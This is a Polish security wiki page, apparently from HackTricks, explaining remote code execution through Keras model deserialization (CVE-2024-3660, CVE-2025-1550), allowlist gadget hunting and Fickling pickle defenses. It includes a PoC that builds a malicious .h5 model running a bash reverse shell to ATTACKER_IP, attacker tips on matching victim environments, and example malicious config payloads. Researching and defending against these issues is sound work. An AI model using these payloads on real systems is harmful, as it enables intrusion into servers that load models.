# RCE podczas deserializacji modeli Keras i wyszukiwanie gadgetów

{{#include ../../banners/hacktricks-training.md}}

Ta strona podsumowuje praktyczne techniki wykorzystywania pipeline'u deserializacji modeli Keras, wyjaśnia wewnętrzne elementy natywnego formatu .keras i jego attack surface oraz udostępnia researcher toolkit do wyszukiwania Model File Vulnerabilities (MFVs) i gadgetów post-fix.

## Wewnętrzne elementy formatu modeli .keras

Plik .keras jest archiwum ZIP zawierającym co najmniej:<sup>[[1]](#references)</sup>
- metadata.json – ogólne informacje (np. wersja Keras)
- config.json – architektura modelu (główny attack surface)
- model.weights.h5 – wagi w formacie HDF5

Plik config.json steruje rekurencyjną deserializacją: Keras importuje moduły, rozpoznaje klasy/funkcje i odtwarza warstwy/obiekty ze słowników kontrolowanych przez attackera.<sup>[[1]](#references)</sup>

Przykładowy fragment obiektu warstwy Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserializacja wykonuje:<sup>[[1]](#references)</sup>
- Import modułu i rozwiązywanie symboli na podstawie kluczy module/class_name
- Wywołanie from_config(...) lub konstruktora z kontrolowanymi przez atakującego kwargs
- Rekurencję w zagnieżdżonych obiektach (activations, initializers, constraints itd.)

Historycznie udostępniało to atakującemu tworzącemu config.json trzy prymitywy:<sup>[[1]](#references)</sup>
- Kontrolę nad importowanymi modułami
- Kontrolę nad tym, które klasy/funkcje są rozwiązywane
- Kontrolę nad kwargs przekazywanymi do konstruktorów/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Przyczyna:
- Lambda.from_config() używało python_utils.func_load(...), które dekoduje dane base64 i wywołuje marshal.loads() na bajtach kontrolowanych przez atakującego; unmarshalling w Pythonie może wykonywać kod.<sup>[[1]](#references)[[3]](#references)</sup>

Pomysł na exploit (uproszczony payload w config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras wymusza domyślnie safe_mode=True. Serializowane funkcje Python w Lambda są blokowane, chyba że użytkownik jawnie zrezygnuje z tego zabezpieczenia za pomocą safe_mode=False.<sup>[[1]](#references)</sup>

Uwagi:
- Legacy formats (starsze zapisy HDF5) lub starsze codebase’y mogą nie wymuszać nowoczesnych kontroli, dlatego ataki typu „downgrade” nadal mogą mieć zastosowanie, gdy ofiary korzystają ze starszych loaderów.

## CVE-2025-1550 – Arbitrary module import w Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn korzystał z nieograniczonego importlib.import_module() z kontrolowanymi przez attackera stringami modułów z config.json.
- Impact: Arbitrary import dowolnego zainstalowanego modułu (lub modułu umieszczonego przez attackera w sys.path). Kod wykonywany podczas importu uruchamia się, a następnie następuje konstrukcja obiektu z użyciem kwargs kontrolowanych przez attackera.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Ulepszenia bezpieczeństwa (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist modułów: importy są ograniczone do oficjalnych modułów ekosystemu: keras, keras_hub, keras_cv, keras_nlp
- Domyślny safe mode: safe_mode=True blokuje niebezpieczne ładowanie serialized-function dla Lambda
- Podstawowe sprawdzanie typów: deserializowane obiekty muszą odpowiadać oczekiwanym typom

## Praktyczne wykorzystanie: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Wiele stosów produkcyjnych nadal akceptuje starsze pliki modeli TensorFlow-Keras HDF5 (.h5). Jeśli attacker może przesłać model, który serwer później załaduje lub wykorzysta do uruchomienia inference, warstwa Lambda może wykonać dowolny kod Python podczas ładowania, budowania lub predykcji.<sup>[[7]](#references)</sup>

Minimalny PoC do utworzenia złośliwego pliku .h5, który wykonuje reverse shell podczas deserializacji lub użycia:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Uwagi i wskazówki dotyczące niezawodności:
- Punkty wyzwalające: kod może uruchomić się wielokrotnie (np. podczas budowania warstwy/pierwszego wywołania, `model.load_model` oraz `predict`/`fit`). Twórz payloads idempotentne.<sup>[[7]](#references)</sup>
- Przypinanie wersji: dopasuj TF/Keras/Python do środowiska ofiary, aby uniknąć niezgodności serializacji. Na przykład twórz artefakty w Pythonie 3.8 z TensorFlow 2.13.1, jeśli tego używa cel.<sup>[[7]](#references)</sup>
- Szybka replikacja środowiska:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Walidacja: nieszkodliwy payload, taki jak `os.system("ping -c 1 YOUR_IP")`, pomaga potwierdzić wykonanie (np. obserwując pakiety ICMP za pomocą tcpdump)<sup>[[7]](#references)</sup> przed przełączeniem na reverse shell.

## Powierzchnia gadgetów po poprawce w allowlist

Nawet przy allowlisting i safe mode wśród dozwolonych wywoływalnych obiektów Keras pozostaje szeroka powierzchnia ataku. Na przykład `keras.utils.get_file` może pobierać dowolne URL-e do lokalizacji wybranych przez użytkownika.<sup>[[1]](#references)</sup>

Gadget za pośrednictwem Lambda odwołującej się do dozwolonej funkcji (bez serializowanego Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Ważne ograniczenie:
- Lambda.call() dodaje tensor wejściowy jako pierwszy argument pozycyjny podczas wywoływania docelowego callable. Wybrane gadgets muszą tolerować dodatkowy argument pozycyjny (lub akceptować *args/**kwargs). Ogranicza to liczbę funkcji, które można wykorzystać.<sup>[[1]](#references)</sup>

## Allowlisting importów ML pickle dla modeli AI/ML (Fickling)

Wiele formatów modeli AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, starsze artefakty TensorFlow itd.) zawiera dane Python pickle. Atakujący rutynowo nadużywają importów pickle GLOBAL i konstruktorów obiektów, aby uzyskać RCE lub podmienić model podczas ładowania. Skanery oparte na blacklistach często pomijają nowe lub nieuwzględnione niebezpieczne importy.<sup>[[8]](#references)[[14]](#references)</sup>

Praktyczną metodą obrony fail-closed jest podpięcie deserializera pickle języka Python i zezwalanie podczas unpicklingu wyłącznie na sprawdzony zestaw nieszkodliwych importów związanych z ML. Fickling firmy Trail of Bits implementuje tę politykę i udostępnia starannie przygotowaną allowlistę importów ML utworzoną na podstawie tysięcy publicznych plików pickle z Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Model bezpieczeństwa dla „bezpiecznych” importów (intuicje wynikające z badań i praktyki): symbole importowane i używane przez pickle muszą jednocześnie:<sup>[[8]](#references)</sup>
- Nie wykonywać kodu ani nie powodować jego wykonania (bez skompilowanych/źródłowych obiektów kodu, uruchamiania poleceń powłoki, hooków itd.)
- Nie pobierać ani nie ustawiać dowolnych atrybutów lub elementów
- Nie importować ani nie uzyskiwać referencji do innych obiektów Pythona z maszyny wirtualnej pickle
- Nie uruchamiać żadnych dodatkowych deserializerów (np. marshal, zagnieżdżonego pickle), nawet pośrednio

Włącz ochronę Ficklinga możliwie wcześnie podczas uruchamiania procesu, aby wszystkie operacje pickle load wykonywane przez frameworki (torch.load, joblib.load itd.) były sprawdzane:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Wskazówki operacyjne:
- W razie potrzeby możesz tymczasowo wyłączyć/ponownie włączyć hooks:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Jeśli znany, bezpieczny model zostanie zablokowany, po przejrzeniu symboli rozszerz allowlist dla swojego środowiska:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling udostępnia również ogólne mechanizmy ochrony runtime, jeśli potrzebujesz bardziej granularnej kontroli:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() aby wymusić kontrole dla wszystkich pickle.load()
- with fickling.check_safety(): aby wymusić kontrole w określonym zakresie
- fickling.load(path) / fickling.is_likely_safe(path) do jednorazowych kontroli

- Jeśli to możliwe, preferuj formaty modeli inne niż pickle (np. SafeTensors).<sup>[[15]](#references)</sup> Jeśli musisz akceptować pickle, uruchamiaj loadery z minimalnymi uprawnieniami, bez dostępu do sieci wychodzącej, i wymuszaj allowlistę.

Ta strategia oparta w pierwszej kolejności na allowliście skutecznie blokuje typowe ścieżki exploitów ML pickle, zachowując jednocześnie wysoką kompatybilność. W benchmarku ToB Fickling wykrył 100% syntetycznych złośliwych plików i zaakceptował około 99% czystych plików z najpopularniejszych repozytoriów Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Toolkit badacza

1) Systematyczne wykrywanie gadgetów w dozwolonych modułach

Wylicz potencjalne callable w modułach keras, keras_nlp, keras_cv, keras_hub i nadaj priorytet tym, które mają skutki uboczne związane z plikami, siecią, procesami lub środowiskiem.<sup>[[1]](#references)</sup>

<details>
<summary>Wylicz potencjalnie niebezpieczne callable w modułach Keras znajdujących się na allowliście</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Bezpośrednie testowanie deserializacji (bez potrzeby archiwum .keras)

Przekazuj spreparowane słowniki bezpośrednio do deserializerów Keras, aby poznać akceptowane parametry i obserwować efekty uboczne.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Testowanie między wersjami i formatami

Keras występuje w wielu codebase'ach/erach, z różnymi zabezpieczeniami i formatami:<sup>[[1]](#references)</sup>
- Wbudowany Keras w TensorFlow: tensorflow/python/keras (legacy, przeznaczony do usunięcia)
- tf-keras: utrzymywany osobno
- Multi-backend Keras 3 (official): wprowadzono natywny format .keras

Powtórz testy w różnych codebase'ach i formatach (.keras oraz legacy HDF5), aby wykryć regresje lub brakujące zabezpieczenia.

## References

- [1] [Wyszukiwanie podatności w deserializacji modeli Keras (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Dodano kontrole do serializacji](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE podczas deserializacji Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Dowolny import modułu Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Raport huntr – dowolny import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Raport huntr – dowolny import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE Lambda TensorFlow .h5 do root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blog Trail of Bits – nowy skaner plików pickle AI/ML firmy Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – zabezpieczanie środowisk AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Korpus benchmarków skanowania pickle Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Wprowadzenie do ataków Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Projekt SafeTensors](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
